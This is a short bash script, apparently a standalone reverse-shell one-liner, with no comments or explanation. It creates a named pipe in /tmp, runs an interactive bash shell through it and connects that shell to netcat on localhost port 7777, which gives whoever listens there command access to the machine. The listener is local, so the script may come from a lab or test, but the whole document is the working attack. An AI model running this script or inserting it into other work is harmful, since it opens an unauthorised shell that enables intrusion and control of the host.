#!/bin/bash
mkfifo /tmp/f
/bin/bash 0</tmp/f | nc localhost 7777 1>/tmp/f && rm /tmp/f

